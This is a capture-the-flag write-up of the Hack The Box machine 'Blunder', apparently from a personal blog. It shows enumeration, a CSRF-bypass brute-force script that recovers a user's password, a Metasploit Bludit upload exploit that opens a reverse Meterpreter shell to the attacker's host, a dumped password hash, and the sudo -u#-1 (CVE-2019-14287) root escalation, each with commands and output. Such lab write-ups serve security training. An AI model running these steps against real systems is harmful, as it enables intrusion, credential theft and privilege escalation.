---
layout: post
category: writeup
---

## Machine Info

- Name: Blunder
- Description: Blunder is an Easy difficulty Linux machine that features a Bludit CMS instance running on port 80. The website contains various facts about different genres. Using GoBuster, we identify a text file that hints to the existence of user fergus, as well as an admin login page that is protected against brute force. An exploit that bypasses the brute force protection is identified, and a dictionary attack is run against the login form. This attack grants us access to the admin panel as fergus. A GitHub issue detailing an arbitrary file upload and directory traversal vulnerability is identified, which is used to gain a shell as www-data. The system is enumerated and a newer version of the Bludit CMS is identified in the /var/www folder. The updated version contains the SHA1 hash of user hugo&amp;amp;#039;s password. The password can be cracked online, allowing us to move laterally to this user. Enumeration reveals that the user can run commands as any system user apart from root using sudo. The sudo binary is identified to be outdated, and vulnerable to CVE-2019-14287. Successful exploitation of this vulnerability returns a root shell.
- Difficulty: Easy

## Initial Access

Nmap:
```bash
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: A0F0E5D852F0E3783AF700B6EE9D00DA
|_http-generator: Blunder
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts
```

I start a dirsearch:
```bash
dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u http://10.10.10.191/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, txt, html | HTTP method: GET | Threads: 64 | Wordlist size: 1102725

Output File: /home/kali/.dirsearch/reports/10.10.10.191/-_24-01-30_11-38-35.txt

Error Log: /home/kali/.dirsearch/logs/errors-24-01-30_11-38-35.log

Target: http://10.10.10.191/

[11:38:35] Starting: 
[11:38:37] 200 -    3KB - /about
[11:38:41] 403 -  277B  - /icons/
[11:38:44] 200 -    7KB - /0
[11:38:52] 200 -    2KB - /admin/
[11:38:52] 301 -    0B  - /admin  ->  http://10.10.10.191/admin/
[11:39:22] 200 -   30B  - /install.php
[11:40:31] 200 -   22B  - /robots.txt
[11:41:20] 200 -  118B  - /todo.txt
[11:41:24] 200 -    4KB - /usb
[11:42:12] 200 -    1KB - /LICENSE
```

I find todo.txt:

```bash
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```

I see the username fergus, I also see a ton of blog posts, let me cewl them into a wordlist:
```bash
HTB cewl 10.10.10.191/ > pass.txt
```

From there, the bludit instance has an admin page login. This page uses csrf to attempt to protect against brute force attacks. So I use a brute force bypass script that retrieves the csrf and sends it with every request to help me with the brute force:

```bash
ruby 48746.rb -r http://10.10.10.191/admin/ -u fergus -w pass.txt
[*] Trying password: Contribution
[*] Trying password: Letters
[*] Trying password: probably
[*] Trying password: best
[*] Trying password: fictional
[*] Trying password: character
[*] Trying password: RolandDeschain

[+] Password found: RolandDeschain
```

With the creds, I can execute an authenticated image upload exploit:
```bash
msf6 exploit(linux/http/bludit_upload_images_exec) > set bludituser fergus
bludituser => fergus
msf6 exploit(linux/http/bludit_upload_images_exec) > set bluditpass RolandDeschain
bluditpass => RolandDeschain
msf6 exploit(linux/http/bludit_upload_images_exec) > set rhosts 10.10.10.191
rhosts => 10.10.10.191
msf6 exploit(linux/http/bludit_upload_images_exec) > set lhost tun0
lhost => 10.10.14.7
msf6 exploit(linux/http/bludit_upload_images_exec) > run

[*] Started reverse TCP handler on 10.10.14.7:4444 
[+] Logged in as: fergus
[*] Retrieving UUID...
[*] Uploading DSqPRddkCv.png...
[*] Uploading .htaccess...
[*] Executing DSqPRddkCv.png...
[*] Sending stage (39927 bytes) to 10.10.10.191
[+] Deleted .htaccess
[*] Meterpreter session 1 opened (10.10.14.7:4444 -> 10.10.10.191:60782) at 2024-01-30 12:08:08 -0500
```
## Privilege Escalation

I find another updated version of bludit in the /var/www directory.

I check the users.php file and see a username Hugo and an encrypted password:

```bash
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php
cat users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```

Crack the password:
![](assets/images/2024-01-30-HTB-blunder-writeup-image-1.png)

I can switch users into Hugo, I check their sudo privs and see the following:

```bash
hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ sudo -l
sudo -l
Password: Password120

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ sudo -V
sudo -V
Sudo version 1.8.25p1
Sudoers policy plugin version 1.8.25p1
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.25p1
```

This sudo version is vulnerable to a `-u#-1` exploit that essentially tricks the sudo command into allowing me to run a command as root even though it is not allowed:

```bash
hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ sudo -u#-1 /bin/bash
sudo -u#-1 /bin/bash
root@blunder:/var/www/bludit-3.10.0a/bl-content/databases#
```

## Beyond Root

Don't leave your passwords on the webpage, 